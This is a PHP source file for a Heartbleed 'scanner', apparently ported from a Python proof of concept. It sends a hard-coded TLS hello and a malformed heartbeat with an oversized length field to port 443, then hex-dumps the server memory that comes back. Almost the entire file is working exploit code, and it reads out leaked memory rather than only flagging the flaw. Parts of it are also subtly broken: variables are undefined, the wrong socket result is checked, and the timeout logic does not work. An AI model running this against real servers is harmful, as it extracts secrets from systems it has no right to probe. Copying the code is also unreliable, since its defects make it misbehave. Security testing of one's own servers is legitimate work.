<?php

/**
 * Based on port of heartbleed POC from Python
 * @link http://github.com/zerquix18/heartbleed
 **/
class heartbleed extends scanner
{
	/**
     * Tests a single URL for Heartbleed vulnerability
     *
     * @access Public
     * @param String The URL to test
     * @param String The name of the log file to record results to
     * @param String The name of the swap file to record the current host being scanned
     * @return void
     */
    public function scanUrl($candidate, $logFile, $swapFile)
    {
        $website = new stdClass;

        echo "\n\n".str_repeat('*', 60);

        echo "\n\nScanning $siteNumber of $listCount :: $candidate";

        ftruncate($swapFile, 0);

        fwrite($swapFile, $candidate);

        $this->updateLogs($logFile, $candidate, 'a+');



		ob_start();

		if( false == ($this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) ) ) {
			exit("Unable to create socket!");
		}

		echo "Connecting to socket...\n";

		$this->socket_ = socket_connect( $this->socket, $candidate, 443 );

		if( ! $this->socket ) {
			exit("Error [". socket_last_error() . "]: " . socket_strerror( socket_last_error() ) . "\n" );
		}

		echo "Sending client hello...\n";

		@socket_send($this->socket, $this->getHello(), strlen($this->getHello()), 0 );

		ob_flush();

		while( true ) {
			list($typ, $ver, $pay) = $this->recvmsg();

			if( null == $typ ) {
				exit("Server closed conection without sending hello!\n");
			}

			if( 22 == $typ && ord($pay[0]) == 0x0E ) {
				break;
			}
		}

		echo "Sending heartbeat request...\n";

		ob_flush();

		@socket_send($this->socket, $this->getHb(), strlen($this->getHb()), 0);

		$this->hit_hb();	
	}
	

	public function h2bin($x)
	{
		$x = str_replace( array(" ", "\n"), "", $x);
		return hex2bin($x);
	}

	public function getHello()
	{
		$hello = $this->h2bin("16 03 02 00  dc 01 00 00 d8 03 02 53
		43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
		bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
		00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
		00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
		c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
		c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
		c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
		c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
		00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
		03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
		00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
		00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
		00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
		00 0f 00 01 01");

		return $hello;
	}

	public function getHb()
	{
		$hb = $this->h2bin("18 03 02 00 03
		01 40 00");

		return $hb;
	}

	/**
	*
	* Thanks: http://stackoverflow.com/a/4225813/1932946
	**/
	public function hexdump($data)
	{
	  $width = 16;
	  $pad = '.';
	  $from = '';
	  $to = '';

	  if ($from==='') {
	    for ($i=0; $i<=0xFF; $i++) {
	      $from .= chr($i);
	      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
	    }
	  }
	  
	  $hex = str_split(bin2hex($data), $width*2);

	  $chars = str_split(strtr($data, $from, $to), $width);

	  $offset = 0;

	  foreach ($hex as $i => $line) {
	    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . "]\n";
	    $offset += $width;
	  }
	}

	public function recvall($length, $timeout = 5)
	{
		
		$endtime = time() + $timeout;
		$rdata = "";
		$remain = $length;

		while($remain > 0) {
			$rtime = $endtime - $timeout;

			if( $rtime < 0 ) {
				return null;
			}

			$e = NULL;
			$r = array($this->socket);
			@socket_select( $r, $w, $e, 5);

			if( in_array($this->socket, $r) ) {
				$d = @socket_recv($this->socket, $data, $remain, 0 );
				
				if( false == $data ) {
					return null;
				}

				$rdata .= $data;
				$remain -= strlen($data);
			}
		}
		
		return $rdata;
	}

	public function recvmsg()
	{
		$hdr = $this->recvall(5);

		if( null === $hdr ) {
			echo "Unexpected EOF receiving record header - server closed connection\n";
			return array(null, null, null);
		}

		
		list($typ, $ver, $ln) = array_values( unpack("Cn/n/nC", $hdr) );

		$pay = $this->recvall($ln, 10);

		if( null === $pay ) {
			echo "Unexpected EOF receiving record payload - server closed connection\n";
			return array(null, null, null);
		}

		printf(" ... received message: type = %d, ver = %04x, length = %d\n", $typ, $ver, strlen($pay) );

		return array($typ, $ver, $pay);
	}

	public function hit_hb()
	{
		socket_send($this->socket, $this->getHb(), strlen($this->getHb()), 0);

		while( true ) {
			list($typ, $ver, $pay) = $this->recvmsg();

			if( null === $typ ) {
				 exit('No heartbeat response received, server likely not vulnerable');
			}
			if( 24 == $typ ) {
				echo "Received heartbeat response:\n";

				$this->hexdump($pay);

				if( strlen($pay) > 3 ) {
					echo 'WARNING: server returned more data than it should - server is vulnerable!';
				}
				else {
					echo 'Server processed malformed heartbeat, but did not return any extra data.';
				}

				return true;
			}
			if( 21 == $typ ) {
				echo "Received alert:\n";

				$this->hexdump($pay);

				echo 'Server returned error, likely not vulnerable';

				return false;
			}
		}
	}
	
}
